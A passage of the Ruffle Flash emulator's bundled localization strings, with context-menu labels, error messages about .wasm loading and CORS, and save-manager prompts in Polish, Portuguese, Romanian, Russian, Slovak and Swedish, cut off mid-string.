"save-manager.ftl": "save-delete-prompt = Czy na pewno chcesz skasować ten plik zapisu?\nsave-reload-prompt =\n    Jedyną opcją, aby { $action ->\n        [delete] usunąć\n       *[replace] zamienić\n    } ten plik zapisu bez potencjalnych konfliktów jest przeładowanie zawartości. Czy chcesz kontynuować?\nsave-download = Pobierz\nsave-replace = Zamień\nsave-delete = Usuń\nsave-backup-all = Pobierz wszystkie pliki zapisu\n", "volume-controls.ftl": "volume-controls = Sterowanie głośnością\nvolume-controls-mute = Wycisz\nvolume-controls-volume = Głośność\n"}, "pt-BR": {"context_menu.ftl": "context-menu-download-swf = Baixar .swf\ncontext-menu-copy-debug-info = Copiar informação de depuração\ncontext-menu-open-save-manager = Abrir o Gerenciador de Salvamento\ncontext-menu-about-ruffle =\n    { $flavor ->\n        [extension] Sobre a extensão do Ruffle ({ $version })\n       *[other] Sobre o Ruffle ({ $version })\n    }\ncontext-menu-hide = Esconder este menu\ncontext-menu-exit-fullscreen = Sair da tela cheia\ncontext-menu-enter-fullscreen = Entrar em tela cheia\n", "messages.ftl": 'message-cant-embed =\n    Ruffle não conseguiu executar o Flash incorporado nesta página.\n    Você pode tentar abrir o arquivo em uma guia separada para evitar esse problema.\npanic-title = Algo deu errado :(\nmore-info = Mais informação\nrun-anyway = Executar mesmo assim\ncontinue = Continuar\nreport-bug = Reportar Bug\nupdate-ruffle = Atualizar Ruffle\nruffle-demo = Demo Web\nruffle-desktop = Aplicativo de Desktop\nruffle-wiki = Ver Wiki do Ruffle\nview-error-details = Ver detalhes do erro\nopen-in-new-tab = Abrir em uma nova guia\nclick-to-unmute = Clique para ativar o som\nerror-file-protocol =\n    Parece que você está executando o Ruffle no protocolo "file:".\n    Isto não funciona como navegadores bloqueiam muitos recursos de funcionar por razões de segurança.\n    Ao invés disso, convidamos você a configurar um servidor local ou a usar a demonstração da web, ou o aplicativo de desktop.\nerror-javascript-config =\n    O Ruffle encontrou um grande problema devido a uma configuração incorreta do JavaScript.\n    Se você for o administrador do servidor, convidamos você a verificar os detalhes do erro para descobrir qual parâmetro está com falha.\n    Você também pode consultar o wiki do Ruffle para obter ajuda.\nerror-wasm-not-found =\n    Ruffle falhou ao carregar o componente de arquivo ".wasm" necessário.\n    Se você é o administrador do servidor, por favor, certifique-se de que o arquivo foi carregado corretamente.\n    Se o problema persistir, você pode precisar usar a configuração "publicPath": por favor consulte a wiki do Ruffle para obter ajuda.\nerror-wasm-mime-type =\n    Ruffle encontrou um grande problema ao tentar inicializar.\n    Este servidor de web não está servindo ".wasm" arquivos com o tipo MIME correto.\n    Se você é o administrador do servidor, por favor consulte o wiki do Ruffle para obter ajuda.\nerror-swf-fetch =\n    Ruffle falhou ao carregar o arquivo Flash SWF.\n    A razão provável é que o arquivo não existe mais, então não há nada para o Ruffle carregar.\n    Tente contatar o administrador do site para obter ajuda.\nerror-swf-cors =\n    Ruffle falhou ao carregar o arquivo Flash SWF.\n    O acesso para fetch provavelmente foi bloqueado pela política CORS.\n    Se você for o administrador do servidor, consulte o wiki do Ruffle para obter ajuda.\nerror-wasm-cors =\n    Ruffle falhou ao carregar o componente de arquivo ".wasm" necessário.\n    O acesso para fetch foi provavelmente bloqueado pela política CORS.\n    Se você é o administrador do servidor, por favor consulte a wiki do Ruffle para obter ajuda.\nerror-wasm-invalid =\n    Ruffle encontrou um grande problema ao tentar inicializar.\n    Parece que esta página tem arquivos ausentes ou inválidos para executar o Ruffle.\n    Se você for o administrador do servidor, consulte o wiki do Ruffle para obter ajuda.\nerror-wasm-download =\n    O Ruffle encontrou um grande problema ao tentar inicializar.\n    Muitas vezes isso pode se resolver sozinho, então você pode tentar recarregar a página.\n    Caso contrário, contate o administrador do site.\nerror-wasm-disabled-on-edge =\n    O Ruffle falhou ao carregar o componente de arquivo ".wasm" necessário.\n    Para corrigir isso, tente abrir configurações do seu navegador, clicando em "Privacidade, pesquisa e serviços", rolando para baixo e desativando "Melhore sua segurança na web".\n    Isso permitirá que seu navegador carregue os arquivos ".wasm" necessários.\n    Se o problema persistir, talvez seja necessário usar um navegador diferente.\nerror-javascript-conflict =\n    Ruffle encontrou um grande problema ao tentar inicializar.\n    Parece que esta página usa código JavaScript que entra em conflito com o Ruffle.\n    Se você for o administrador do servidor, convidamos você a tentar carregar o arquivo em uma página em branco.\nerror-javascript-conflict-outdated = Você também pode tentar fazer o upload de uma versão mais recente do Ruffle que pode contornar o problema (a compilação atual está desatualizada: { $buildDate }).\nerror-csp-conflict =\n    Ruffle encontrou um grande problema ao tentar inicializar.\n    A política de segurança de conteúdo deste servidor da web não permite a execução do componente ".wasm" necessário.\n    Se você for o administrador do servidor, consulte o wiki do Ruffle para obter ajuda.\nerror-unknown =\n    O Ruffle encontrou um grande problema enquanto tentava exibir este conteúdo em Flash.\n    { $outdated ->\n        [true] Se você é o administrador do servidor, por favor tente fazer o upload de uma versão mais recente do Ruffle (a compilação atual está desatualizada: { $buildDate }).\n       *[false] Isso não deveria acontecer, então apreciaríamos muito se você pudesse arquivar um bug!\n    }\n', "save-manager.ftl": "save-delete-prompt = Tem certeza que deseja excluir este arquivo de salvamento?\nsave-reload-prompt =\n    A única maneira de { $action ->\n        [delete] excluir\n       *[replace] substituir\n    } este arquivo sem potencial conflito é recarregar este conteúdo. Deseja continuar mesmo assim?\nsave-download = Baixar\nsave-replace = Substituir\nsave-delete = Excluir\nsave-backup-all = Baixar todos os arquivos de salvamento\n", "volume-controls.ftl": ""}, "pt-PT": {"context_menu.ftl": "context-menu-download-swf = Descarga.swf\ncontext-menu-copy-debug-info = Copiar informações de depuração\ncontext-menu-open-save-manager = Abrir Gestor de Gravações\ncontext-menu-about-ruffle =\n    { $flavor ->\n        [extension] Sobre a extensão do Ruffle ({ $version })\n       *[other] Sobre o Ruffle ({ $version })\n    }\ncontext-menu-hide = Esconder este menu\ncontext-menu-exit-fullscreen = Fechar Ecrã Inteiro\ncontext-menu-enter-fullscreen = Abrir Ecrã Inteiro\ncontext-menu-volume-controls = Controlos de volume\n", "messages.ftl": 'message-cant-embed =\n    O Ruffle não conseguiu abrir o Flash integrado nesta página.\n    Para tentar resolver o problema, pode abrir o ficheiro num novo separador.\npanic-title = Algo correu mal :(\nmore-info = Mais informações\nrun-anyway = Executar mesmo assim\ncontinue = Continuar\nreport-bug = Reportar falha\nupdate-ruffle = Atualizar o Ruffle\nruffle-demo = Demonstração na Web\nruffle-desktop = Aplicação para Desktop\nruffle-wiki = Ver a Wiki do Ruffle\nenable-hardware-acceleration = Parece que a aceleração de hardware não está ativada. Mesmo que o Ruffle funcione, pode estar excessivamente lento. Descubra como ativar a aceleração de hardware seguindo este link.\nview-error-details = Ver detalhes do erro\nopen-in-new-tab = Abrir num novo separador\nclick-to-unmute = Clique para ativar o som\nerror-file-protocol =\n    Parece que executa o Ruffle no protocolo "file:".\n    Isto não funciona, já que os navegadores bloqueiam muitas funcionalidades por razões de segurança.\n    Em vez disto, recomendados configurar um servidor local ou usar a demonstração na web, ou a aplicação para desktop.\nerror-javascript-config =\n    O Ruffle encontrou um problema maior devido a uma configuração de JavaScript incorreta.\n    Se é o administrador do servidor, convidamo-lo a verificar os detalhes do erro para descobrir o parâmetro problemático.\n    Pode ainda consultar a wiki do Ruffle para obter ajuda.\nerror-wasm-not-found =\n    O Ruffle falhou ao carregar o componente de ficheiro ".wasm" necessário.\n    Se é o administrador do servidor, por favor certifique-se de que o ficheiro foi devidamente carregado.\n    Se o problema persistir, poderá querer usar a configuração "publicPath": consulte a wiki do Ruffle para obter ajuda.\nerror-wasm-mime-type =\n    O Ruffle encontrou um problema maior ao tentar inicializar.\n    Este servidor de web não suporta ficheiros ".wasm" com o tipo MIME correto.\n    Se é o administrador do servidor, por favor consulte o wiki do Ruffle para obter ajuda.\nerror-swf-fetch =\n    Ruffle falhou ao carregar o arquivo SWF do Flash\n    A razão mais provável é que o arquivo não existe mais, então não há nada para o Ruffle carregar.\n    Tente contactar o administrador do site para obter ajuda.\nerror-swf-cors =\n    O Ruffle falhou ao carregar o ficheiro Flash SWF.\n    Acesso a buscar foi provavelmente bloqueado pela política de CORS.\n    Se é o administrador do servidor, por favor consulte a wiki do Ruffle para obter ajuda.\nerror-wasm-cors =\n    O Ruffle falhou ao carregar o componente de ficheiro ".wasm" necessário.\n    O acesso a buscar foi provavelmente bloqueado pela política CORS.\n    Se é o administrador do servidor, por favor consulte a wiki do Ruffle para obter ajuda.\nerror-wasm-invalid =\n    Ruffle encontrou um grande problema ao tentar inicializar.\n    Parece que esta página está ausente ou arquivos inválidos para executar o Ruffle.\n    Se você é o administrador do servidor, por favor consulte a wiki do Ruffle para obter ajuda.\nerror-wasm-download =\n    O Ruffle encontrou um problema maior ao tentar inicializar.\n    Isto frequentemente resolve-se sozinho, portanto experimente recarregar a página.\n    Caso contrário, por favor contacte o administrador do site.\nerror-wasm-disabled-on-edge =\n    O Ruffle falhou ao carregar o componente de ficheiro ".wasm" necessário.\n    Para corrigir isso, tente abrir as opções do seu navegador, clicando em "Privacidade, pesquisa e serviços", rolando para baixo e desativando "Melhore a sua segurança na web".\n    Isto permitirá ao seu navegador carregar os ficheiros ".wasm" necessários.\n    Se o problema persistir, talvez seja necessário usar um navegador diferente.\nerror-javascript-conflict =\n    O Ruffle encontrou um problema maior ao tentar inicializar.\n    Parece que esta página usa código JavaScript que entra em conflito com o Ruffle.\n    Se é o administrador do servidor, convidamo-lo a tentar carregar o ficheiro em numa página em branco.\nerror-javascript-conflict-outdated = Pode ainda tentar carregar uma versão mais recente do Ruffle que talvez contorne o problema (a compilação atual está desatualizada: { $buildDate }).\nerror-csp-conflict =\n    O Ruffle encontrou um problema maior ao tentar inicializar.\n    A Política de Segurança de Conteúdo deste servidor não permite que o componente ".wasm" necessário seja executado.\n    Se é o administrador do servidor, por favor consulte o wiki do Ruffle para obter ajuda.\nerror-unknown =\n    O Ruffle encontrou um problema maior enquanto tentava mostrar este conteúdo em Flash.\n    { $outdated ->\n        [true] Se é o administrador do servidor, por favor tente carregar uma versão mais recente do Ruffle (a compilação atual está desatualizada: { $buildDate }).\n       *[false] Não era suposto isto ter acontecido, por isso agradeceríamos muito se pudesse reportar a falha!\n    }\n', "save-manager.ftl": "save-delete-prompt = Tem a certeza de que quer apagar esta gravação?\nsave-reload-prompt =\n    A única forma de { $action ->\n        [delete] apagar\n       *[replace] substituir\n    } esta gravação sem um potencial conflito é recarregar este conteúdo. Deseja continuar mesmo assim?\nsave-download = Descarregar\nsave-replace = Substituir\nsave-delete = Apagar\nsave-backup-all = Descarregar todas as gravações\n", "volume-controls.ftl": "volume-controls = Controlos de volume\nvolume-controls-mute = Silenciar\nvolume-controls-volume = Volume\n"}, "ro-RO": {"context_menu.ftl": "context-menu-download-swf = Descarcă .swf\ncontext-menu-copy-debug-info = Copiază informațiile de depanare\ncontext-menu-open-save-manager = Deschide managerul de salvări\ncontext-menu-about-ruffle =\n    { $flavor ->\n        [extension] Despre extensia Ruffle ({ $version })\n       *[other] Despre Ruffle ({ $version })\n    }\ncontext-menu-hide = Ascunde acest meniu\ncontext-menu-exit-fullscreen = Ieși din ecranul complet\ncontext-menu-enter-fullscreen = Intră în ecran complet\n", "messages.ftl": 'message-cant-embed =\n    Ruffle nu a putut rula Flash încorporat în această pagină.\n    Puteți încerca să deschideți fișierul într-o filă separată, pentru a evita această problemă.\npanic-title = Ceva a mers prost :(\nmore-info = Mai multe informații\nrun-anyway = Rulează oricum\ncontinue = Continuă\nreport-bug = Raportează un bug\nupdate-ruffle = Actualizează Ruffle\nruffle-demo = Demo web\nruffle-desktop = Aplicație desktop\nruffle-wiki = Vezi wikiul Ruffle\nview-error-details = Vezi detaliile erorii\nopen-in-new-tab = Deschide într-o filă nouă\nclick-to-unmute = Dă click pentru a dezmuți\nerror-file-protocol =\n    Se pare că rulezi Ruffle pe protocolul „file:”.\n    Acesta nu funcționează, deoarece browserele blochează funcționarea multor funcții din motive de securitate.\n    În schimb, te invităm să configurezi un server local sau să folosești fie demoul web, fie aplicația desktop.\nerror-javascript-config =\n    Ruffle a întâmpinat o problemă majoră din cauza unei configurări incorecte a JavaScript.\n    Dacă sunteți administratorul serverului, vă invităm să verificați detaliile de eroare pentru a afla care parametru este defect.\n    Puteți consulta și Ruffle wiki pentru ajutor.\nerror-wasm-not-found =\n    Ruffle a eșuat la încărcarea componentei de fișier ".wasm".\n    Dacă sunteți administratorul serverului, vă rugăm să vă asigurați că fișierul a fost încărcat corect.\n    Dacă problema persistă, poate fi necesar să utilizaţi setarea "publicPath": vă rugăm să consultaţi Ruffle wiki pentru ajutor.\nerror-wasm-mime-type =\n    Ruffle a întâmpinat o problemă majoră în timp ce se încerca inițializarea.\n    Acest server web nu servește ". asm" fișiere cu tipul corect MIME.\n    Dacă sunteți administrator de server, vă rugăm să consultați Ruffle wiki pentru ajutor.\nerror-swf-fetch =\n    Ruffle a eșuat la încărcarea fișierului Flash SWF.\n    Motivul cel mai probabil este că fişierul nu mai există, deci nu există nimic pentru Ruffle să se încarce.\n    Încercați să contactați administratorul site-ului web pentru ajutor.\nerror-swf-cors =\n    Ruffle a eșuat la încărcarea fișierului Flash SWF.\n    Accesul la preluare a fost probabil blocat de politica CORS.\n    Dacă sunteţi administratorul serverului, vă rugăm să consultaţi Ruffle wiki pentru ajutor.\nerror-wasm-cors =\n    Ruffle a eșuat în încărcarea componentei de fișier ".wasm".\n    Accesul la preluare a fost probabil blocat de politica CORS.\n    Dacă sunteţi administratorul serverului, vă rugăm să consultaţi Ruffle wiki pentru ajutor.\nerror-wasm-invalid =\n    Ruffle a întâmpinat o problemă majoră în timp ce se încearcă inițializarea.\n    Se pare că această pagină are fișiere lipsă sau invalide pentru rularea Ruffle.\n    Dacă sunteţi administratorul serverului, vă rugăm să consultaţi Ruffle wiki pentru ajutor.\nerror-wasm-download =\n    Ruffle a întâmpinat o problemă majoră în timp ce încerca să inițializeze.\n    Acest lucru se poate rezolva adesea, astfel încât puteţi încerca să reîncărcaţi pagina.\n    Altfel, vă rugăm să contactaţi administratorul site-ului.\nerror-wasm-disabled-on-edge =\n    Ruffle nu a putut încărca componenta de fișier ".wasm".\n    Pentru a remedia acest lucru, încercați să deschideți setările browser-ului dvs., apăsând pe "Confidențialitate, căutare și servicii", derulând în jos și închizând "Îmbunătățește-ți securitatea pe web".\n    Acest lucru va permite browser-ului să încarce fișierele ".wasm" necesare.\n    Dacă problema persistă, ar putea fi necesar să folosiți un browser diferit.\nerror-javascript-conflict =\n    Ruffle a întâmpinat o problemă majoră în timp ce încerca să inițializeze.\n    Se pare că această pagină folosește codul JavaScript care intră în conflict cu Ruffle.\n    Dacă sunteţi administratorul serverului, vă invităm să încărcaţi fişierul pe o pagină goală.\nerror-javascript-conflict-outdated = De asemenea, poți încerca să încarci o versiune mai recentă de Ruffle care poate ocoli problema (versiunea curentă este expirată: { $buildDate }).\nerror-csp-conflict =\n    Ruffle a întâmpinat o problemă majoră în timp ce se încerca inițializarea.\n    Politica de securitate a conținutului acestui server web nu permite serviciul necesar". asm" componentă pentru a rula.\n    Dacă sunteți administratorul de server, consultați Ruffle wiki pentru ajutor.\nerror-unknown =\n    Ruffle a întâmpinat o problemă majoră în timp ce încerca să afișeze acest conținut Flash.\n    { $outdated ->\n        [true] Dacă ești administratorul serverului, te rugăm să încerci să încarci o versiune mai recentă de Ruffle (versiunea actuală este depăşită: { $buildDate }).\n       *[false] Acest lucru nu ar trebui să se întâmple, așa că am aprecia foarte mult dacă ai putea trimite un bug!\n    }\n', "save-manager.ftl": "save-delete-prompt = Sigur vrei să ștergi acest fișier de salvare?\nsave-reload-prompt =\n    Singura cale de a { $action ->\n        [delete] șterge\n       *[replace] înlocui\n    } acest fișier de salvare fără un conflict potențial este de a reîncărca acest conținut. Dorești să continui oricum?\nsave-download = Descarcă\nsave-replace = Înlocuiește\nsave-delete = Șterge\n", "volume-controls.ftl": "volume-controls = Comenzi pentru volum\n"}, "ru-RU": {"context_menu.ftl": "context-menu-download-swf = Скачать .swf\ncontext-menu-copy-debug-info = Копировать отладочную информацию\ncontext-menu-open-save-manager = Менеджер сохранений\ncontext-menu-about-ruffle =\n    { $flavor ->\n        [extension] О расширении Ruffle ({ $version })\n       *[other] О Ruffle ({ $version })\n    }\ncontext-menu-hide = Скрыть это меню\ncontext-menu-exit-fullscreen = Оконный режим\ncontext-menu-enter-fullscreen = Полноэкранный режим\ncontext-menu-volume-controls = Громкость\n", "messages.ftl": 'message-cant-embed =\n    Ruffle не смог запустить Flash, используемый на этой странице.\n    Чтобы обойти эту проблему, вы можете попробовать открыть файл в отдельной вкладке.\npanic-title = Что-то пошло не так :(\nmore-info = Подробнее\nrun-anyway = Всё равно запустить\ncontinue = Продолжить\nreport-bug = Сообщить об ошибке\nupdate-ruffle = Обновить Ruffle\nruffle-demo = Веб-демо\nruffle-desktop = Настольное приложение\nruffle-wiki = Открыть вики Ruffle\nenable-hardware-acceleration = Похоже, что аппаратное ускорение не включено. Хоть Ruffle и будет работать, он может быть неоправданно медленным. О том, как включить аппаратное ускорение, можно узнать, перейдя по ссылке.\nview-error-details = Сведения об ошибке\nopen-in-new-tab = Открыть в новой вкладке\nclick-to-unmute = Включить звук\nerror-file-protocol =\n    Похоже, что вы запускаете Ruffle по протоколу "file:".\n    Это не работает, поскольку браузеры блокируют работу многих функций по соображениям безопасности.\n    Вместо этого мы предлагаем вам использовать настольное приложение, веб-демо или настроить локальный сервер.\nerror-javascript-config =\n    Возникла серьёзная ошибка из-за неправильной конфигурации JavaScript.\n    Если вы являетесь администратором сервера, мы предлагаем вам проверить детали ошибки, чтобы выяснить, какой параметр дал сбой.\n    Вы также можете обратиться за помощью к вики Ruffle.\nerror-wasm-not-found =\n    Ruffle не удалось запустить необходимый компонент файла ".wasm".\n    Если вы администратор сервера, пожалуйста, убедитесь, что файл был загружен правильно.\n    Если проблема не устраняется, вам может потребоваться использовать настройку "publicPath": обратитесь к вики Ruffle.\nerror-wasm-mime-type =\n    Ruffle столкнулся с серьёзной проблемой во время инициализации.\n    Этот веб-сервер не предоставляет файлы ".wasm" с правильным типом MIME.\n    Если вы администратор сервера, обратитесь за помощью к вики Ruffle.\nerror-swf-fetch =\n    Ruffle не удалось запустить SWF-файл Flash.\n    Вероятнее всего, файл больше не существует, поэтому Ruffle нечего загружать.\n    Попробуйте связаться с администратором сайта для получения помощи.\nerror-swf-cors =\n    Ruffle не удалось запустить SWF-файл Flash.\n    Скорее всего, доступ к файлу был заблокирован политикой CORS.\n    Если вы администратор сервера, обратитесь за помощью к вики Ruffle.\nerror-wasm-cors =\n    Ruffle не удалось загрузить необходимый компонент файла ".wasm".\n    Скорее всего, доступ к файлу был заблокирован политикой CORS.\n    Если вы администратор сервера, обратитесь за помощью к вики Ruffle.\nerror-wasm-invalid =\n    Ruffle столкнулся с серьёзной проблемой во время инициализации.\n    Похоже, что на этой странице отсутствуют файлы для запуска Ruffle или они недействительны.\n    Если вы администратор сервера, обратитесь за помощью к вики Ruffle.\nerror-wasm-download =\n    Ruffle столкнулся с серьёзной проблемой во время инициализации.\n    Чаще всего эта проблема устраняется сама собою, поэтому вы можете просто перезагрузить страницу.\n    Если ошибка продолжает появляться, свяжитесь с администратором сайта.\nerror-wasm-disabled-on-edge =\n    Ruffle не удалось загрузить необходимый компонент файла ".wasm".\n    Чтобы исправить эту ошибку, попробуйте отключить в настройках браузера дополнительную конфиденциальность. Это позволит браузеру загрузить необходимые WASM-файлы.\n    Если проблема осталась, вам может потребоваться другой браузер.\nerror-javascript-conflict =\n    Ruffle столкнулся с серьёзной проблемой во время инициализации.\n    Похоже, что эта страница использует конфликтующий с Ruffle код JavaScript.\n    Если вы являетесь администратором сервера, мы предлагаем вам попробовать запустить файл на пустой странице.\nerror-javascript-conflict-outdated = Вы также можете попробовать загрузить последнюю версию Ruffle, которая может обойти проблему (текущая версия устарела: { $buildDate }).\nerror-csp-conflict =\n    Ruffle столкнулся с серьёзной проблемой во время инициализации.\n    Политика безопасности содержимого этого веб-сервера не позволяет использовать требуемые компоненты для запуска ".wasm".\n    Если вы являетесь администратором сервера, обратитесь за помощью к вики Ruffle.\nerror-unknown =\n    Ruffle столкнулся с серьёзной проблемой при попытке отобразить этот Flash-контент.\n    { $outdated ->\n        [true] Если вы администратор сервера, попробуйте загрузить более новую версию Ruffle (текущая версия устарела: { $buildDate }).\n       *[false] Этого не должно происходить, поэтому мы будем очень признательны, если вы сообщите нам об ошибке!\n    }\n', "save-manager.ftl": "save-delete-prompt = Удалить этот файл сохранения?\nsave-reload-prompt =\n    Единственный способ { $action ->\n        [delete] удалить\n       *[replace] заменить\n    } этот файл сохранения без потенциального конфликта – перезапустить запущенный контент. Всё равно продолжить?\nsave-download = Скачать\nsave-replace = Заменить\nsave-delete = Удалить\nsave-backup-all = Скачать все сохранения\n", "volume-controls.ftl": "volume-controls = Регулировка громкости\nvolume-controls-mute = Без звука\nvolume-controls-volume = Громкость\n"}, "sk-SK": {"context_menu.ftl": "context-menu-download-swf = Stiahnuť .swf\ncontext-menu-copy-debug-info = Skopírovať debug info\ncontext-menu-open-save-manager = Otvoriť správcu uložení\ncontext-menu-about-ruffle =\n    { $flavor ->\n        [extension] O Ruffle rozšírení ({ $version })\n       *[other] O Ruffle ({ $version })\n    }\ncontext-menu-hide = Skryť menu\ncontext-menu-exit-fullscreen = Ukončiť režim celej obrazovky\ncontext-menu-enter-fullscreen = Prejsť do režimu celej obrazovky\ncontext-menu-volume-controls = Ovládanie hlasitosti\n", "messages.ftl": 'message-cant-embed =\n    Ruffle nemohol spustiť Flash vložený na tejto stránke.\n    Môžete sa pokúsiť otvoriť súbor na samostatnej karte, aby ste sa vyhli tomuto problému.\npanic-title = Niečo sa pokazilo :(\nmore-info = Viac informácií\nrun-anyway = Spustiť aj tak\ncontinue = Pokračovať\nreport-bug = Nahlásiť chybu\nupdate-ruffle = Aktualizovať Ruffle\nruffle-demo = Web Demo\nruffle-desktop = Desktopová aplikácia\nruffle-wiki = Zobraziť Ruffle Wiki\nenable-hardware-acceleration = Zdá sa, že hardvérová akcelerácia nie je povolená. Aj keď Ruffle funguje správne, môže byť neprimerane pomalý. Ako povoliť hardvérovú akceleráciu zistíte na tomto odkaze.\nview-error-details = Zobraziť podrobnosti o chybe\nopen-in-new-tab = Otvoriť na novej karte\nclick-to-unmute = Kliknutím zapnete zvuk\nerror-file-protocol =\n    Zdá sa, že používate Ruffle na protokole "file:".\n    To nie je možné, pretože prehliadače blokujú fungovanie mnohých funkcií z bezpečnostných dôvodov.\n    Namiesto toho vám odporúčame nastaviť lokálny server alebo použiť web demo či desktopovú aplikáciu.\nerror-javascript-config =\n    Ruffle narazil na problém v dôsledku nesprávnej konfigurácie JavaScriptu.\n    Ak ste správcom servera, odporúčame vám skontrolovať podrobnosti o chybe, aby ste zistili, ktorý parameter je chybný.\n    Pomoc môžete získať aj na wiki Ruffle.\nerror-wasm-not-found =\n    Ruffle sa nepodarilo načítať požadovaný komponent súboru „.wasm“.\n    Ak ste správcom servera, skontrolujte, či bol súbor správne nahraný.\n    Ak problém pretrváva, možno budete musieť použiť nastavenie „publicPath“: pomoc nájdete na wiki Ruffle.\nerror-wasm-mime-type =\n    Ruffle narazil na problém pri pokuse o inicializáciu.\n    Tento webový server neposkytuje súbory „.wasm“ so správnym typom MIME.\n    Ak ste správcom servera, pomoc nájdete na Ruffle wiki.\nerror-swf-fetch =\n    Ruffle sa nepodarilo načítať SWF súbor Flash.\n    Najpravdepodobnejším dôvodom je, že súbor už neexistuje, takže Ruffle nemá čo načítať.\n    Skúste požiadať o pomoc správcu webovej lokality.\nerror-swf-cors =\n    Ruffle sa nepodarilo načítať SWF súbor Flash.\n    Prístup k načítaniu bol pravdepodobne zablokovaný politikou CORS.\n    Ak ste správcom servera, pomoc nájdete na Ruffle wiki.\nerror-wasm-cors =\n    Ruffle sa nepodarilo načítať požadovaný komponent súboru „.wasm“.\n    Prístup k načítaniu bol pravdepodobne zablokovaný politikou CORS.\n    Ak ste správcom servera, pomoc nájdete na Ruffle wiki.\nerror-wasm-invalid =\n    Ruffle narazil na problém pri pokuse o inicializáciu.\n    Zdá sa, že na tejto stránke chýbajú alebo sú neplatné súbory na spustenie Ruffle.\n    Ak ste správcom servera, pomoc nájdete na Ruffle wiki.\nerror-wasm-download =\n    Ruffle narazil na problém pri pokuse o inicializáciu.\n    Problém sa môže vyriešiť aj sám, takže môžete skúsiť stránku načítať znova.\n    V opačnom prípade kontaktujte administrátora stránky.\nerror-wasm-disabled-on-edge =\n    Ruffle sa nepodarilo načítať požadovaný komponent súboru „.wasm“.\n    Ak chcete tento problém vyriešiť, skúste otvoriť nastavenia prehliadača, kliknite na položku „Ochrana osobných údajov, vyhľadávanie a služby“, prejdite nadol a vypnite možnosť „Zvýšte svoju bezpečnosť na webe“.\n    Vášmu prehliadaču to umožní načítať požadované súbory „.wasm“.\n    Ak problém pretrváva, možno budete musieť použiť iný prehliadač.\nerror-javascript-conflict =\n    Ruffle narazil na problém pri pokuse o inicializáciu.\n    Zdá sa, že táto stránka používa kód JavaScript, ktorý je v konflikte s Ruffle.\n    Ak ste správcom servera, odporúčame vám skúsiť načítať súbor na prázdnu stránku.\nerror-javascript-conflict-outdated = Môžete sa tiež pokúsiť nahrať novšiu verziu Ruffle, ktorá môže daný problém vyriešiť (aktuálny build je zastaraný: { $buildDate }).\nerror-csp-conflict =\n    Ruffle narazil na problém pri pokuse o inicializáciu.\n    Zásady zabezpečenia obsahu tohto webového servera nepovoľujú spustenie požadovaného komponentu „.wasm“.\n    Ak ste správcom servera, pomoc nájdete na Ruffle wiki.\nerror-unknown =\n    Ruffle narazil na problém pri pokuse zobraziť tento Flash obsah.\n    { $outdated ->\n         [true] Ak ste správcom servera, skúste nahrať novšiu verziu Ruffle (aktuálny build je zastaraný: { $buildDate }).\n        *[false] Toto by sa nemalo stať, takže by sme naozaj ocenili, keby ste mohli nahlásiť chybu!\n    }\n', "save-manager.ftl": "save-delete-prompt = Naozaj chcete odstrániť tento súbor s uloženými pozíciami?\nsave-reload-prompt =\n    Jediný spôsob, ako { $action ->\n         [delete] vymazať\n        *[replace] nahradiť\n    } tento súbor s uloženými pozíciami bez potenciálneho konfliktu je opätovné načítanie tohto obsahu. Chcete napriek tomu pokračovať?\nsave-download = Stiahnuť\nsave-replace = Nahradiť\nsave-delete = Vymazať\nsave-backup-all = Stiahnuť všetky súbory s uloženými pozíciami\n", "volume-controls.ftl": "volume-controls = Ovládanie hlasitosti\nvolume-controls-mute = Stlmiť\nvolume-controls-volume = Hlasitosť\n"}, "sv-SE": {"context_menu.ftl": "context-menu-download-swf = Ladda ner .swf\ncontext-menu-copy-debug-info = Kopiera felsökningsinfo\ncontext-menu-open-save-manager = Öppna Sparhanteraren\ncontext-menu-about-ruffle =\n    { $flavor ->\n        [extension] Om Ruffle-tillägget ({ $version })\n       *[other] Om Ruffle ({ $version })\n    }\ncontext-menu-hide = Dölj denna meny\ncontext-menu-exit-fullscreen = Avsluta helskärm\ncontext-menu-enter-fullscreen = Helskärm\ncontext-menu-volume-controls = Ljudkontroller\n", "messages.ftl": 'message-cant-embed =\n    Ruffle kunde inte köra det inbäddade Flashinnehållet på denna sida.\n    Du kan försöka öppna filen i en separat flik för att kringgå problemet.\npanic-title = Något gick fel :(\nmore-info = Mer info\nrun-anyway = Kör ändå\ncontinue = Fortsätt\nreport-bug = Rapportera Bugg\nupdate-ruffle = Uppdatera Ruffle\nruffle-demo = Webbdemo\nruffle-desktop = Skrivbordsprogram\nruffle-wiki = Se Ruffle-wiki\nenable-hardware-acceleration = Det verkar som att hårdvaruacceleration inte är på. Ruffle kan fortfarande fungera men kan vara orimligt långsam. Du kan ta reda på hur man sätter på hårdvaruacceleration genom att följa denna länk.\nview-error-details = Visa Felinformation\nopen-in-new-tab = Öppna i en ny flik\nclick-to-unmute = Klicka för ljud\nerror-file-protocol =\n    Det verkar som att du kör Ruffle på "fil:"-protokollet.\n    Detta fungerar inte eftersom webbläsare blockerar många funktioner från att fungera av säkerhetsskäl.\n    Istället bjuder vi in dig att sätta upp en lokal server eller antingen använda webbdemon eller skrivbordsprogrammet.\nerror-javascript-config =\n    Ruffle har stött på ett stort fel på grund av en felaktig JavaScript-konfiguration.\n    Om du är serveradministratören bjuder vi in dig att kontrollera feldetaljerna för att ta reda på vilken parameter som är felaktig.\n    Du kan också konsultera Ruffle-wikin för hjälp.\nerror-wasm-not-found =\n    Ruffle misslyckades ladda ".wasm"-filkomponenten.\n    Om du är serveradministratören se till att filen har laddats upp korrekt.\n    Om problemet kvarstår kan du behöva använda inställningen "publicPath": konsultera vänligen Ruffle-wikin för hjälp.\nerror-wasm-mime-type =\n    Ruffle har stött på ett stort fel under initialiseringen.\n    Denna webbserver serverar inte ".wasm"-filer med korrekt MIME-typ.\n    Om du är serveradministratören konsultera vänligen Ruffle-wikin för hjälp.\nerror-swf-fetch =\n    Ruffle misslyckades ladda SWF-filen.\n    Det mest sannolika skälet är att filen inte längre existerar, så det finns inget för Ruffle att köra.\n    Försök att kontakta webbplatsadministratören för hjälp.\nerror-swf-cors =\n    Ruffle misslyckades ladda SWF-filen.\n    Åtkomst att hämta har sannolikt blockerats av CORS-policy.\n    Om du är serveradministratören konsultera vänligen Ruffle-wikin för hjälp.\nerror-wasm-cors =\n    Ruffle misslyckades ladda ".wasm"-filkomponenten.\n    Åtkomst att hämta har sannolikt blockerats av CORS-policy.\n    Om du är serveradministratören konsultera vänligen Ruffle-wikin för hjälp.\nerror-wasm-invalid =\n    Ruffle har stött på ett stort fel under initialiseringen.\n    Det verkar som att den här sidan har saknade eller ogiltiga filer för att köra Ruffle.\n    Om du är serveradministratören konsultera 